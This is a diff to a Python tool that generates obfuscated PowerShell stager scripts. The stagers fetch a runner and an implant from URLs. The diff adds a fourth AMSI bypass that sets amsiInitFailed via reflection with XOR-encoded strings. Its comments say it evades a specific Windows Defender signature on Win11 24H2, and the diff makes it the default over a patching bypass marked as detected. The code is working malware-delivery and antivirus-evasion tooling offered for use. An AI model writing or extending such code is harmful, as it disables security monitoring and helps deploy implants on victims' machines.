@@ -60,9 +60,34 @@ def gen_amsi_bypass_v3():
     ])
 
 
+def gen_amsi_bypass_v4():
+    """amsiInitFailed reflection bypass — no VirtualProtect, no WriteByte, no memory patching.
+    Sets AmsiUtils.amsiInitFailed=true via reflection. Avoids AMSI_Patch_T.B12 behavioral sig.
+    Works on Win11 24H2. All strings XOR-encoded so no 'amsi' literals in the script."""
+    key = random.randint(13, 120)
+    vk = rv()
+    vt = rv()
+    vf = rv()
+    # Encode sensitive strings
+    type_enc = xenc("System.Management.Automation.AmsiUtils", key)
+    field_enc = xenc("amsiInitFailed", key)
+    # Use integer for BindingFlags (NonPublic=32, Static=8 → 40)
+    bf_int = 40
+    return '\n'.join([
+        f"{vk}={key}",
+        f"try{{",
+        f"  {vt}=[Ref].Assembly.GetType({xdec(type_enc, vk)})",
+        f"  {vf}={vt}.GetField({xdec(field_enc, vk)},[Reflection.BindingFlags]{bf_int})",
+        f"  {vf}.SetValue($null,$true)",
+        f"}}catch{{}}",
+    ])
+
+
 def gen_amsi_bypass_v2():
     """Add-Type C# bypass: byte-array string construction — no 'amsi' or 'AmsiScanBuffer' literals.
-    Patches AmsiScanBuffer with 0xC3 (RET) via VirtualProtect. Avoids AmsiBypazz signatures."""
+    Patches AmsiScanBuffer with 0xC3 (RET) via VirtualProtect. Avoids AmsiBypazz signatures.
+    NOTE: Detected as Behavior:Win32/AMSI_Patch_T.B12 on Win11 24H2 with updated Defender.
+    Use bypass_version=4 (amsiInitFailed) instead for current targets."""
     # Random class and method names
     cls = ''.join(random.choices(string.ascii_uppercase, k=1)) + \
           ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 10)))
@@ -188,7 +213,7 @@ def gen_exec_chain(dest_var, implant_arg, local=False):
     ])
 
 
-def generate(runner_url, implant_url, output_path="stager.ps1", bypass_version=2):
+def generate(runner_url, implant_url, output_path="stager.ps1", bypass_version=4):
     v_runner_url  = rv()
     v_implant_url = rv()
     v_temp        = rv()
@@ -196,7 +221,9 @@ def generate(runner_url, implant_url, output_path="stager.ps1", bypass_version=2
     v_enc_dest    = rv()
     v_enc_url     = rv()
 
-    if bypass_version == 3:
+    if bypass_version == 4:
+        amsi = gen_amsi_bypass_v4()
+    elif bypass_version == 3:
         amsi = gen_amsi_bypass_v3()
     elif bypass_version == 2:
         amsi = gen_amsi_bypass_v2()
